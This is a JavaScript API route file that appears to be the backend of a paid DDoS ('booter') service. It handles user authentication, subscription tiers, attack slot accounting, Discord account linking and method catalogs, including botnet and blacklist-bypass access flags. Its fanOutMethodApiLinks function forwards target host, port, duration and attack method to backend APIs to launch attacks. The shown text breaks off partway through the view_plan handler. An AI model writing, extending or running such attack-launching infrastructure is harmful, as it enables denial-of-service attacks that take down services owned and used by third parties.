// API route handlers for attack, plan, and status endpoints.
import { jsonResponse, structuredResponse, parseQuery, routeNotFound, makePolishedError } from './response.js';
import * as Vault from './vault-db.js';
import { getPayloadMethods, getPayloadBlacklists } from '../payload.js';
import { getUserLimits, isMethodPermittedForUser } from './policy.js';
import { generateVerificationCode, buildDiscordRoleNames, userPlanRole } from './discord.js';
import { formatSlotBar, generateAttackId, applyGlobalRateLimit, checkUserCooldown, withTimeout, acquireAttackSlots, releaseAttackSlots, acquireOutgoingRequestSlot, releaseOutgoingRequestSlot, lookupIpInfo, trackFailedAuthAttempt, getFailedAuthAttempts, clearFailedAuthAttempts, getClientIp, isUserIpAllowed } from './helpers.js';
import { TIMEOUT_CONFIG, CONCURRENCY_CONFIG, APP_DEFAULTS, resolveApiMessage, resolveApiHint, sendDiscordWebhookForEvent } from './config.js';
import { isIPv4, isPrivateIPRange, isValidTarget, isUrlTarget, isBlacklistedTarget, isBlacklistedByMetadata, validatePayloadLength } from './validator.js';

let SERVICE_START = null;
export function getSafeIpInfo(ipinfo) {
  return ipinfo && typeof ipinfo === 'object' ? ipinfo : {};
}

function isSuspendedUser(user) {
  return user?.suspended === true || user?.suspended === 1 || user?.suspended === '1' || user?.suspended === 'true';
}

function suspendedAccountResponse() {
  return makePolishedError('account suspended', 403, {
    suspended: true,
    hint: 'This account is suspended. Contact an administrator to restore access.'
  });
}

async function authenticateApiCredentials(qv, env, request) {
  const username = String(qv.username || '').trim();
  const providedPassword = (qv.password || qv.pass || '').toString();
  if (!username || !providedPassword) {
    return { ok: false, response: makePolishedError('missing credentials', 401, { hint: 'Provide username and password for this API route.' }) };
  }

  const user = await Vault.getUser(env, username, { fresh: true });
  if (isSuspendedUser(user)) {
    clearFailedAuthAttempts(username);
    return { ok: false, response: suspendedAccountResponse() };
  }

  const authStatus = getFailedAuthAttempts(username);
  if (authStatus.isLocked) {
    return {
      ok: false,
      response: makePolishedError(
        `Account temporarily locked after ${authStatus.limit} failed attempts. Wait ${authStatus.nextAttemptAvailable} seconds before trying again.`,
        429,
        { locked: true, attempts: authStatus.attempts, limit: authStatus.limit }
      )
    };
  }

  if (!user || String(user.password || '') !== providedPassword) {
    const attempts = trackFailedAuthAttempt(username);
    return {
      ok: false,
      response: makePolishedError('invalid credentials', 401, {
        hint: attempts >= authStatus.limit
          ? 'Account is temporarily locked. Try again later.'
          : 'The supplied username or password is incorrect.'
      })
    };
  }

  clearFailedAuthAttempts(username);
  const clientIp = getClientIp(request);
  if (!isUserIpAllowed(user, clientIp)) {
    return { ok: false, response: makePolishedError('access denied from this IP address', 403, { ip: clientIp, whitelisted_ip: user.whitelisted_ip, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' }) };
  }
  await Vault.updateUserLastIp(env, username, clientIp);
  return { ok: true, user };
}

export async function resolveFastIpInfo(target, timeoutMs = 400) {
  const cleanTarget = String(target || '').trim();
  if (!cleanTarget) return {};

  const lookupPromise = lookupIpInfo(cleanTarget);
  const result = await Promise.race([
    lookupPromise.then((data) => ({ data, timedOut: false })),
    new Promise((resolve) => setTimeout(() => resolve({ data: null, timedOut: true }), timeoutMs))
  ]);

  if (result?.data) {
    return getSafeIpInfo(result.data);
  }

  void lookupPromise.catch(() => {});
  return {};
}

export async function resolveTargetGeoInfo(target, timeoutMs = 1500) {
  const cleanTarget = String(target || '').trim();
  if (!cleanTarget) {
    return { status: 'failed', info: {}, elapsedMs: 0 };
  }

  const startedAt = performance.now();
  const lookupPromise = lookupIpInfo(cleanTarget);
  const result = await Promise.race([
    lookupPromise.then((data) => ({
      status: 'resolved',
      info: getSafeIpInfo(data),
      elapsedMs: performance.now() - startedAt
    })),
    new Promise((resolve) => setTimeout(() => resolve({
      status: 'failed',
      info: {},
      elapsedMs: performance.now() - startedAt
    }), timeoutMs))
  ]);

  if (result?.status === 'resolved') {
    return { status: 'resolved', info: getSafeIpInfo(result.info), elapsedMs: Number(result.elapsedMs || 0) };
  }

  void lookupPromise.catch(() => {});
  return { status: 'failed', info: {}, elapsedMs: Number(result?.elapsedMs || 0) };
}

function isPowerSavingEnabled(value) {
  if (value === undefined || value === null || value === '') return true;
  if (typeof value === 'string') {
    const normalized = value.trim().toLowerCase();
    if (['0', 'false', 'off', 'no'].includes(normalized)) return false;
    if (['1', 'true', 'on', 'yes'].includes(normalized)) return true;
  }
  return Boolean(value);
}

export async function ipLookup(ipOrHost) {
  try {
    return await lookupIpInfo(ipOrHost);
  } catch (e) {
    console.warn(`IP lookup failed for ${ipOrHost}: ${e.message}`);
    return null;
  }
}

function expandApiLinkTemplate(template, record) {
  const target = String(record.target || '');
  const tokenMap = {
    '{target}': encodeURIComponent(target),
    '{host}': encodeURIComponent(target),
    '{ip}': encodeURIComponent(target),
    '{port}': encodeURIComponent(Number(record.port || 80)),
    '{duration}': encodeURIComponent(Number(record.duration || 60)),
    '{time}': encodeURIComponent(Number(record.duration || 60)),
    '{method}': encodeURIComponent(record.method || 'udp'),
    '{username}': encodeURIComponent(record.username || 'anon'),
    '{password}': encodeURIComponent(''),
    '{rps}': encodeURIComponent(Number(record.rps || 0)),
    '{threads}': encodeURIComponent(Number(record.threads || 0)),
    '{concurrents}': encodeURIComponent(Number(record.concurrents || 1))
  };

  let expanded = String(template || '');
  for (const [token, value] of Object.entries(tokenMap)) {
    expanded = expanded.split(token).join(value);
  }
  return expanded;
}

export function formatOngoingAttackResponse(items = []) {
  const filtered = (Array.isArray(items) ? items : [])
    .filter((item) => item && Number(item?.duration || 0) > 0 && item?.expires_at)
    .filter((item) => {
      const expiresAt = new Date(item.expires_at).getTime();
      return Number.isFinite(expiresAt) && expiresAt > Date.now();
    });

  if (!filtered.length) {
    return {
      error: false,
      message: resolveApiMessage('no_ongoing_attacks', 'No ongoing attacks found'),
      ...(resolveApiHint('no_ongoing_attacks', null) !== null ? { hint: resolveApiHint('no_ongoing_attacks', null) } : {})
    };
  }

  const now = Date.now();
  return {
    error: false,
    message: resolveApiMessage('ongoing_attacks_success', 'Ongoing attacks retrieved successfully.'),
    data: filtered.map((item) => {
      const expiresAt = new Date(item.expires_at).getTime();
      const remainingMs = expiresAt > now ? Math.max(0, expiresAt - now) : 0;
      const seconds = Math.max(1, Math.ceil(remainingMs / 1000));

      return {
        target: item?.target || 'unknown',
        method: (item?.method || 'udp').toLowerCase(),
        port: Number(item?.port || 80),
        length: Number(item?.duration || item?.length || 60),
        finish: `${seconds} secs`
      };
    })
  };
}

export function normalizeProfilePayload(payload = {}) {
  if (!payload || typeof payload !== 'object') return {};

  const flat = { ...(payload.profile && typeof payload.profile === 'object' ? payload.profile : {}), ...payload };
  delete flat.profile;

  delete flat.service_name;
  delete flat.serviceName;
  delete flat.expiry_unix;
  delete flat.formatted_expiry;

  if (!('expiry_date' in flat) || flat.expiry_date === undefined || flat.expiry_date === null || flat.expiry_date === '') {
    const expiryValue = Number(payload.expiry_unix ?? flat.expiry_unix ?? 0);
    flat.expiry_date = Number.isFinite(expiryValue) && expiryValue > 0 ? new Date(expiryValue * 1000).toISOString() : 'Lifetime';
  }

  return flat;
}

export async function fanOutMethodApiLinks(methodMeta, record) {
  const apiLinks = Array.isArray(methodMeta?.api_links) ? methodMeta.api_links : [];
  if (!apiLinks.length) return [];

  const outcomes = await Promise.all(apiLinks.map(async (link) => {
    const destination = link?.url || '';
    if (!destination) {
      return {
        name: link?.name || 'api_link',
        url: '',
        method: String(link?.method || 'GET').toUpperCase(),
        status: 0,
        ok: false,
        error: 'missing_destination'
      };
    }

    const url = expandApiLinkTemplate(destination, record);
    const method = String(link?.method || 'GET').toUpperCase();

    const slotAcquired = await acquireOutgoingRequestSlot(5000);
    if (!slotAcquired) {
      return {
        name: link?.name || 'api_link',
        url,
        method,
        status: 0,
        ok: false,
        error: 'outgoing_request_limit_exceeded'
      };
    }

    try {
      const init = {
        method,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        }
      };

      if (method === 'POST') {
        const params = new URLSearchParams({
          host: String(record.target || ''),
          port: String(record.port || 80),
          time: String(Number(record.duration || 60)),
          method: String(record.method || 'udp'),
          username: String(record.username || 'anon'),
          concurrents: String(Number(record.concurrents || 1))
        });
        init.body = params.toString();
      }

      const response = await withTimeout(
        fetch(url, init),
        Math.min(TIMEOUT_CONFIG.ATTACK_LAUNCH_TIMEOUT_MS, 1500),
        `Attack launch to ${link?.name || 'backend'}`
      );
      const text = await response.text();
      let payload = null;
      try { payload = text ? JSON.parse(text) : null; } catch (_) { payload = { raw: text }; }

      return {
        name: link?.name || 'api_link',
        url,
        method,
        status: response.status,
        ok: response.ok,
        payload
      };
    } catch (e) {
      return {
        name: link?.name || 'api_link',
        url,
        method,
        status: 0,
        ok: false,
        error: e?.message || 'api link failed'
      };
    } finally {
      releaseOutgoingRequestSlot();
    }
  }));

  return outcomes;
}

// IP and blacklist validation functions moved to validator.js
// Import: isIPv4, isPrivateIPRange, isValidTarget, isUrlTarget, isBlacklistedTarget, isBlacklistedByMetadata

export async function apiHandler(parts, request, env, requestId, logger, requestContext = {}) {
  const q = parseQuery(request);
  const endpoint = parts[0] || '';
  const GLOBAL_API_SLOTS = Number(env.GLOBAL_API_SLOTS || 30);

  // Reuse service metadata already loaded by the request orchestrator when available.
  const [serviceNameFromDb, apiVersionFromDb] = requestContext?.serviceName && requestContext?.apiVersion
    ? [null, null]
    : await Promise.all([Vault.getServiceName(env), Vault.getApiVersion(env)]);
  const serviceName = requestContext?.serviceName || serviceNameFromDb;
  const apiVersion = requestContext?.apiVersion || apiVersionFromDb;

  let requestUser = requestContext.user || null;

  // Only protect sensitive endpoints. Public endpoints (network_statistics, endpoints/docs/help,
  // methods, graph, discord_profile, link, unlink, view_ongoing, my_attacks, view_plan) should be
  // accessible without username/password so bots and unauthenticated callers can receive 404 or public data.
  const PROTECTED_ENDPOINTS = new Set(['attack', 'stop', 'verify']);
  if (PROTECTED_ENDPOINTS.has(endpoint)) {
    const qv = q;
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';

    // Allow bot impersonation via BOT_API_KEY + discord_user_id
    let botAuth = false;
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          qv.username = link.username;
          botAuth = true;
          requestUser = await Vault.getUser(env, qv.username);
        }
      }
    }

    // If not bot-authenticated, require username+password
    if (!botAuth) {
      const auth = await authenticateApiCredentials(qv, env, request);
      if (!auth.ok) return auth.response;
      requestUser = auth.user;
    }

    // Apply rate limiting (respects bypass_anti_spam flag)
    if (requestUser) {
      const rateLimitCheck = applyGlobalRateLimit(`user:${requestUser.username}`, Boolean(requestUser.bypass_anti_spam), 1);
      if (!rateLimitCheck.allowed) {
        return makePolishedError(
          `Rate limited. Please wait ${rateLimitCheck.secondsUntilAvailable} second${rateLimitCheck.secondsUntilAvailable !== 1 ? 's' : ''} before trying again.`,
          429,
          { hint: 'You are making requests too quickly. Upgrade to bypass rate limits or wait before retrying.' }
        );
      }
      // Only update last_request_time after a non-attack request completes. Attack cooldown is enforced in the attack handler.
      if (endpoint !== 'attack') {
        await Vault.updateUserLastRequestTime(env, requestUser.username, request.headers?.get?.('cf-connecting-ip') || null);
      }
    }

    if (isSuspendedUser(requestUser)) return suspendedAccountResponse();
  }



  async function allowUserOrBotAuth(qv, request) {
    const authHeader = (request.headers && request.headers.get ? request.headers.get('Authorization') : null) || '';
    const bearer = authHeader.startsWith('Bearer ') ? authHeader.slice(7).trim() : '';
    // Bot impersonation
    if (bearer && env.BOT_API_KEY && bearer === String(env.BOT_API_KEY)) {
      const discordId = qv.discord_user_id || qv.discord_id || qv.discord;
      if (discordId) {
        const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordId);
        if (link && link.username) {
          const user = requestContext?.user?.username === link.username
            ? requestContext.user
            : await Vault.getUser(env, link.username);
          if (isSuspendedUser(user)) return { ok: false, response: suspendedAccountResponse(), reason: 'suspended' };
          return { ok: true, username: link.username, user, bot: true };
        }
      }
    }
    // Username/password flow
    if (qv.username) {
      const auth = await authenticateApiCredentials(qv, env, request);
      if (!auth.ok) return { ok: false, reason: 'invalid_credentials', response: auth.response };
      if (isSuspendedUser(auth.user)) return { ok: false, reason: 'suspended', response: suspendedAccountResponse() };
      return { ok: true, username: qv.username, user: auth.user, bot: false };
    }
    return { ok: false, reason: 'missing_credentials' };
  }

  function authErrorResponse(auth) {
    if (auth?.response) return auth.response;
    const invalid = auth?.reason === 'invalid_credentials';
    return makePolishedError(invalid ? 'invalid credentials' : 'missing credentials', 401, {
      hint: invalid
        ? 'The supplied username or password is incorrect.'
        : 'Provide username/password or use bot auth with discord_user_id.'
    });
  }

  const ALLOWED_METHODS = Object.fromEntries(
    (getPayloadMethods() || []).filter((item) => item && item.name).map((item) => [String(item.name).toLowerCase(), String(item.target_type || 'ip').toLowerCase()])
  );

  const METHOD_ALIASES = {
    get: 'url',
    post: 'url',
    raw: 'url',
    dns: 'url',
    ack: 'ip'
  };

  Object.assign(ALLOWED_METHODS, METHOD_ALIASES);

  if (endpoint === 'network_statistics') {
    // Batch all DB queries in parallel instead of sequential
    const [
      userStats,
      ongoing,
      attacksToday,
      verifiedDiscordUsers,
      maintenanceMode,
      attacksDisabled
    ] = await Promise.all([
      Vault.getUserStatistics(env),
      Vault.countOngoing(env),
      Vault.countLogsToday(env),
      Vault.countVerifiedDiscordLinks(env),
      requestContext?.maintenanceMode !== undefined
        ? Promise.resolve(requestContext.maintenanceMode)
        : Vault.getMaintenanceMode(env),
      Vault.getAttacksDisabled(env)
    ]);

    const total = userStats.total;
    const activeUsers = userStats.active;
    const suspendedUsers = userStats.suspended;
    const vipUsers = userStats.vip;
    const holderUsers = userStats.holder;
    const resellerUsers = userStats.reseller;
    const healthStatus = suspendedUsers > 0 || ongoing > 0 ? 'degraded' : 'stable';

    return jsonResponse({
      error: false,
      message: resolveApiMessage('network_statistics_success', 'Network statistics retrieved successfully.'),
      data: {
        online_users_count: activeUsers,
        total_users_count: total,
        active_users_count: activeUsers,
        vip_users_count: vipUsers,
        holder_users_count: holderUsers,
        reseller_users_count: resellerUsers,
        suspended_users_count: suspendedUsers,
        expired_users_count: 0,
        attacks_are_enabled: !attacksDisabled,
        total_ongoing_attacks: ongoing,
        total_attacks_today: attacksToday,
        total_warning_count: 0,
        verified_discord_users_count: verifiedDiscordUsers,
        max_attack_api_slots: GLOBAL_API_SLOTS,
        health_status: healthStatus,
        maintenance_mode: maintenanceMode,
        src_name: APP_DEFAULTS.SRC_NAME,
        src_uptime: requestContext?.uptime || 'unknown'
      }
    }, 200, { service: serviceName, version: apiVersion });
  }


  if (endpoint === 'graph') {
    if (!SERVICE_START) SERVICE_START = Date.now();
    
    const payloadMethods = getPayloadMethods();
    const methodsWithSlots = payloadMethods.filter((m) => Number(m.max_slots || 0) > 0);
    const methodNames = methodsWithSlots.map((m) => m.name.toLowerCase());
    
    // Batch all queries in parallel
    const [ongoing, maintenance, methodSlotCounts] = await Promise.all([
      Vault.countOngoing(env),
      requestContext?.maintenanceMode !== undefined
        ? Promise.resolve(requestContext.maintenanceMode)
        : Vault.getMaintenanceMode(env),
      Vault.countMethodsOngoingBatch(env, methodNames)
    ]);
    
    const totalSlots = GLOBAL_API_SLOTS;
    const usedSlots = ongoing;
    const slotBar = formatSlotBar(usedSlots, totalSlots);
    const lastMaintenance = env.LAST_MAINTENANCE || env.LAST_MAINTENANCE_AT || null;
    const uptimeMs = Date.now() - SERVICE_START;
    const uptimeSeconds = Math.floor(uptimeMs / 1000);
    const uptimeHours = Math.floor(uptimeSeconds / 3600);
    const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
    const uptime = `${uptimeHours}h ${uptimeMinutes}m`;
    
    // Build method slots with cached counts
    const methodSlots = methodsWithSlots.map((method) => {
      const maxSlots = Number(method.max_slots || 0);
      const methodUsed = methodSlotCounts[method.name.toLowerCase()] || 0;
      return {
        method: method.name,
        total: maxSlots,
        used: methodUsed,
        percent: maxSlots ? Math.min(100, Math.round((methodUsed / maxSlots) * 100)) : 0,
        bar: formatSlotBar(methodUsed, maxSlots)
      };
    });

    const planMethodAccess = { free: [], vip: [], holder: [], vip_or_holder: [] };
    for (const method of payloadMethods) {
      const vipRequired = Boolean(method.plan_restrictions?.vip);
      const holderRequired = Boolean(method.plan_restrictions?.holder);
      if (vipRequired && holderRequired) {
        planMethodAccess.vip_or_holder.push(method.name);
      } else if (vipRequired) {
        planMethodAccess.vip.push(method.name);
      } else if (holderRequired) {
        planMethodAccess.holder.push(method.name);
      } else {
        planMethodAccess.free.push(method.name);
      }
    }

    return jsonResponse({
      error: false,
      message: 'graph stats loaded',
      data: {
        max_attack_api_slots: totalSlots,
        api_slots: {
          total: totalSlots,
          used: usedSlots,
          available: Math.max(0, totalSlots - usedSlots),
          percent: totalSlots ? ((usedSlots / totalSlots) * 100).toFixed(2) : '0.00',
          bar: slotBar
        },
        c2_slots: {
          active_attacks: ongoing,
          bar: slotBar
        },
        method_slots: methodSlots,
        plan_method_access: planMethodAccess,
        maintenance: {
          enabled: maintenance,
          last_maintenance: lastMaintenance
        },
        uptime,
        updated_at: new Date().toISOString()
      }
    }, 200, { service: serviceName, version: apiVersion });
  }

  if (endpoint === 'methods') {
    // Public method catalog (no admin credentials required)
    const payloadMethods = getPayloadMethods();
    const dbMethods = await Vault.listMethods(env);
    const sourceMethods = dbMethods?.length ? dbMethods : payloadMethods;
    const methodMap = new Map((payloadMethods || []).map((item) => [String(item?.name || '').toLowerCase(), item]));

    const methods = (sourceMethods || [])
      .map((method) => {
        const meta = methodMap.get(String(method?.name || '').toLowerCase()) || null;
        return {
          id: method?.id || null,
          name: method?.name || null,
          description: method?.description || meta?.description || `${method?.name || 'method'} method`,
          target_type: meta?.target_type || null,
          default_port: meta?.default_port || null,
          max_time: meta?.max_time || null,
          max_concurrents: meta?.max_concurrents || null,
          max_slots: meta?.max_slots || null
        };
      })
      .sort((a, b) => {
        const aId = Number(a?.id ?? Number.MAX_SAFE_INTEGER);
        const bId = Number(b?.id ?? Number.MAX_SAFE_INTEGER);
        return aId - bId;
      });

    return structuredResponse({ error: false, message: resolveApiMessage('public_methods_loaded', 'public methods loaded'), data: methods });
  }

  if (endpoint === 'discord_profile') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return authErrorResponse(auth);
    const discordUserId = q.discord_user_id || q.discord_id || q.user_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to lookup your linked profile.' });
    const link = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!link || !link.username) return jsonResponse({ error: true, message: 'Discord account not linked. Use /link to verify your account first; /plan is only available for linked users.', client: null }, 404, { service: serviceName, version: apiVersion });
    const user = await Vault.getUser(env, link.username);
    if (!user) return jsonResponse({ error: true, message: 'Linked user account no longer exists.' }, 500, { service: serviceName, version: apiVersion });
    const warningSummary = await Vault.getUserWarningSummary(env, user.username);
    const discordLink = await Vault.getDiscordLinkByUsername(env, user.username);
    const profilePayload = normalizeProfilePayload({
      username: user.username,
      admin: Boolean(user.admin),
      vip: Boolean(user.vip),
      holder: Boolean(user.holder),
      reseller: Boolean(user.reseller),
      max_time: Number(user.max_time || 60),
      cooldown: Number(user.cooldown || 10),
      max_concurrents: Number(user.max_concurrents || 1),
      max_daily_attacks: Number(user.max_daily_attacks || 100),
      suspended: Boolean(user.suspended),
      suspend_reason: user.suspend_reason || null,
      suspended_by: user.suspended_by || null,
      resellers_service: Boolean(user.created_by && user.created_by !== user.username),
      expiry_unix: Number(user.expiry_unix || 0),
      is_banned: Boolean(user.suspended),
      powered_saving: isPowerSavingEnabled(user.power_saving),
      anti_spam: Boolean(user.bypass_anti_spam || false),
      bypass_blacklist: Boolean(user.bypass_blacklist || false),
      api: Boolean(user.api ?? user.api_access),
      mfa_enabled: Boolean(user.mfa_enabled || false),
      account_status: user.suspended ? 'suspended' : warningSummary.count >= 5 ? 'at_limit' : 'active',
      warnings: Number(warningSummary.count || 0),
      discord_link: discordLink
    });

    if (!('raw_access' in profilePayload)) profilePayload.raw_access = Boolean(user.raw_access || false);
    if (!('star_access' in profilePayload)) profilePayload.star_access = Boolean(user.star_access || false);
    if (!('botnet_access' in profilePayload)) profilePayload.botnet_access = Boolean(user.botnet_access || false);
    if (!('private_access' in profilePayload)) profilePayload.private_access = Boolean(user.private_access || false);

    return jsonResponse({
      error: false,
      message: resolveApiMessage('discord_profile_loaded', 'discord profile loaded'),
      data: profilePayload,
      service: serviceName
    }, 200, { service: serviceName });
  }

  if (endpoint === 'verify') {
    const username = q.username;
    const password = q.password;
    const client = q.client || 'discord';
    if (!username || !password || !client) return makePolishedError('missing username, password or client', 400, { hint: 'Send username, password and client=discord in the query string.' });

    const user = await Vault.getUser(env, username);
    if (!user) return jsonResponse({ error: true, message: resolveApiMessage('user_does_not_exist', 'user does not exist'), client, code: null }, 404, { service: serviceName, version: apiVersion });
    if (!(await Vault.verifyUserPassword(env, user, password))) return jsonResponse({ error: true, message: resolveApiMessage('invalid_credentials', 'wrong password'), client, code: null }, 401, { service: serviceName, version: apiVersion });
    const clientIp = getClientIp(request);
    if (!isUserIpAllowed(user, clientIp)) return makePolishedError('access denied from this IP address', 403, { ip: clientIp, whitelisted_ip: user.whitelisted_ip, hint: 'This account is restricted to a specific IP address. Contact an administrator to change the whitelist.' });
    await Vault.updateUserLastIp(env, username, clientIp);
    if (user.suspended) return jsonResponse({ error: true, message: resolveApiMessage('account_suspended', 'account suspended'), client, code: null }, 403, { service: serviceName, version: apiVersion });
    if (!(user.api ?? user.api_access)) return jsonResponse({ error: true, message: resolveApiMessage('api_access_disabled', 'api access disabled'), client, code: null }, 403, { service: serviceName, version: apiVersion });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: resolveApiMessage('user_already_verified', 'user already verified via Discord; use admin/unlink_discord to reset'),
        client,
        code: null,
        discord_link: {
          discord_user_id: existingVerified.discord_user_id,
          discord_username: existingVerified.discord_username,
          verified_at: existingVerified.verified_at
        }
      }, 409, { service: serviceName, version: apiVersion });
    }

    const code = generateVerificationCode();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();
    await Vault.createDiscordLinkRequest(env, username, client, code, expiresAt);
    return jsonResponse({ error: false, message: resolveApiMessage('verification_code_generated', 'verification code generated'), client, code, expires_at: expiresAt }, 200, { service: serviceName, version: apiVersion });
  }

  if (endpoint === 'link') {
    const code = q.code;
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    const discordUsername = q.discord_username || q.discord_user_name || q.user_name || q.username || null;
    const client = q.client || 'discord';
    if (!code || !discordUserId) return makePolishedError('missing code or discord_user_id', 400, { hint: 'Send code and discord_user_id in the query string.' });
    // Allow bot auth or username/password for link completion
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return authErrorResponse(auth);

    const existingDiscordLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (existingDiscordLink) {
      return jsonResponse({
        error: true,
        message: resolveApiMessage('discord_already_linked', 'This Discord account is already linked. Use /unlink first, then run /link again with a new code.'),
        client,
        code: null,
        discord_link: { username: existingDiscordLink.username, discord_user_id: discordUserId, discord_username: existingDiscordLink.discord_username }
      }, 409, { service: serviceName, version: apiVersion });
    }

    const requestRow = await Vault.getDiscordLinkByCode(env, code);
    if (!requestRow) return jsonResponse({ error: true, message: resolveApiMessage('invalid_or_unknown_code', 'invalid or unknown code'), client, code }, 404, { service: serviceName, version: apiVersion });
    if (requestRow.client !== client) return jsonResponse({ error: true, message: 'client mismatch', client, code }, 400, { service: serviceName, version: apiVersion });
    if (requestRow.status === 'verified') return jsonResponse({ error: true, message: resolveApiMessage('code_already_used', 'code already used'), client, code }, 409, { service: serviceName, version: apiVersion });
    if (new Date() > new Date(requestRow.expires_at)) return jsonResponse({ error: true, message: resolveApiMessage('code_expired', 'code expired'), client, code }, 410, { service: serviceName, version: apiVersion });

    const existingVerified = await Vault.getVerifiedDiscordLinkByUsername(env, requestRow.username);
    if (existingVerified) {
      return jsonResponse({
        error: true,
        message: resolveApiMessage('discord_already_linked', 'The user account is already linked to Discord. Ask the current Discord owner to run /unlink first, then use /link again.'),
        client,
        code,
        discord_link: { username: existingVerified.username, discord_user_id: existingVerified.discord_user_id, discord_username: existingVerified.discord_username }
      }, 409, { service: serviceName, version: apiVersion });
    }

    const verifiedRow = await Vault.verifyDiscordLinkCode(env, code, discordUserId, discordUsername);
    const linkedUser = await Vault.getUser(env, verifiedRow.username);
    if (!linkedUser) return jsonResponse({ error: true, message: resolveApiMessage('linked_user_no_longer_exists', 'linked user no longer exists'), client, code }, 500, { service: serviceName, version: apiVersion });

    const roles = buildDiscordRoleNames(linkedUser, env);
    const planRole = userPlanRole(linkedUser, env);
    return jsonResponse({ error: false, message: resolveApiMessage('discord_account_verified', 'discord account verified'), client, code, discord_user_id: discordUserId, username: linkedUser.username, roles, plan_role: planRole }, 200, { service: serviceName, version: apiVersion });
  }

  if (endpoint === 'unlink') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth || !auth.ok) return makePolishedError('missing credentials', 401, { hint: 'Provide username/password or use bot auth with discord_user_id.' });
    const discordUserId = q.discord_user_id || q.user_id || q.discord_id;
    if (!discordUserId) return makePolishedError('missing discord_user_id', 400, { hint: 'Provide discord_user_id to remove your Discord link.' });
    const existingLink = await Vault.getVerifiedDiscordLinkByDiscordId(env, discordUserId);
    if (!existingLink || !existingLink.username) return jsonResponse({ error: true, message: resolveApiMessage('discord_not_linked', 'Discord account is not currently linked. Use /link to verify first.') }, 404, { service: serviceName, version: apiVersion });
    
    let unlinked = null;
    try {
      unlinked = await Vault.unlinkDiscordLinkByDiscordId(env, discordUserId, 'self');
    } catch (e) {
      return jsonResponse({ error: true, message: `Failed to unlink Discord account: ${e.message}` }, 500, { service: serviceName, version: apiVersion });
    }
    
    if (!unlinked || !unlinked.username) return jsonResponse({ error: true, message: 'Unable to unlink Discord account at this time.' }, 500, { service: serviceName, version: apiVersion });
    return jsonResponse({ error: false, message: resolveApiMessage('discord_account_unlinked', 'Discord account unlinked successfully.'), discord_user_id: discordUserId, discord_username: unlinked.discord_username, username: unlinked.username, unlinked_at: unlinked.unlinked_at }, 200, { service: serviceName, version: apiVersion });
  }

  if (endpoint === 'view_plan') {
    const qv = q;
    const auth = await allowUserOrBotAuth(qv, request);
    if (!auth.ok) return authErrorResponse(auth);
    const u = auth.user || await Vault.getUser(env, auth.username);
    if (!u) return makePolishedError('user not found', 404, { hint: `User '${auth.username}' does not exist.` });
    
    // Apply rate limiting with bypass support
    const rateLimitCheck = applyGlobalRateLimit(`user:${auth.username}`, Boolean(u.bypass_anti_spam), 1);
    if (!rateLimitCheck.allowed) {
      return makePolishedError(
        `Rate limited. Please wait ${rateLimitCheck.secondsUntilAvailable} second${rateLimitCheck.secondsUntilAvailable !== 1 ? 's' : ''} before trying again.`,
        429,
        { hint: 'You are making requests too quickly. Upgrade to bypass rate limits or wait before retrying.' }
      );
    }
    
    const [discordLink, attacksToday, planSettings] = await Promise.all([
      Vault.getVerifiedDiscordLinkByUsername(env, u.username),
      Vault.countUserDailyAttacks(env, u.username),
      Vault.resolveUserPlanSettings(env, u)
    ]);
    const attacksRemaining = Math.max(0, Number(u.max_daily_attacks || 0) - Number(attacksToday || 0));
    
    // Determine plan type and rank
    const planType = planSettings?.plan_name || 'Default';
    let rank = 'User';
    if (u.admin) rank = 'Admin';
    else if (u.reseller) rank = 'Reseller';
    else if (u.holder) rank = 'Holder';
    else if (u.vip) rank = 'VIP';
    
    // Format dates
    const createdAt = u.created_at ? new Date(u.created_at).toISOString().replace('T', ' ').substring(0, 19) : null;
    const expiryDate = u.expiry_unix && u.expiry_unix > 0 ? new Date(u.expiry_unix * 1000).toISOString() : 'Lifetime';
    
    const responsePayload = {
      error: false,
      message: resolveApiMessage('user_plan_retrieved', 'User plan retrieved successfully.'),
      data: {
        username: u.username,
        admin: Boolean(u.admin),
        vip: Boolean(u.vip),
        holder: Boolean(u.holder),
        reseller: Boolean(u.reseller),
        owner: Boolean(u.owner || false),
        api: Boolean(u.api ?? u.api_access),
        max_time: Number(u.max_time || 60),
        min_time: Number(u.min_time || 0),
        cooldown: Number(u.cooldown || 10),
        concurrents: Number(u.max_concurrents || u.concurrents || 1),
        max_daily_attacks: Number(u.max_daily_attacks || 100),
        attacks_remaining: attacksRemaining,
        powersaving: isPowerSavingEnabled(u.power_saving),
        bypass_power: !isPowerSavingEnabled(u.power_saving),
        bypass_anti_spam: Boolean(u.bypass_anti_spam || false),
        bypass_blacklist: Boolean(u.bypass_blacklist || false),
        raw_access: Boolean(planSettings?.raw_access ?? u.raw_access ?? false),
        star_access: Boolean(planSettings?.star_access ?? u.star_access ?? false),
        botnet_access: Boolean(planSettings?.botnet_access ?? u.botnet_access ?? false),
        private_access: Boolean(planSettings?.private_access ?? u.private_access ?? false),
        suspended: Boolean(u.suspended),
        created_by: u.created_by || null,
        creation_date: createdAt,
        expiry_date: expiryDate,
        warnings: Number((await Vault.getUserWarningSummary(env, u.username)).count || 0),
        discord_linked: discordLink ? discordLink.discord_user_id : null,
        plan_type: planType,
        rank: rank
      }
    };

    void sendDiscordWebhookForEvent('view', {
      route: 'view_plan',
      username: u.username,
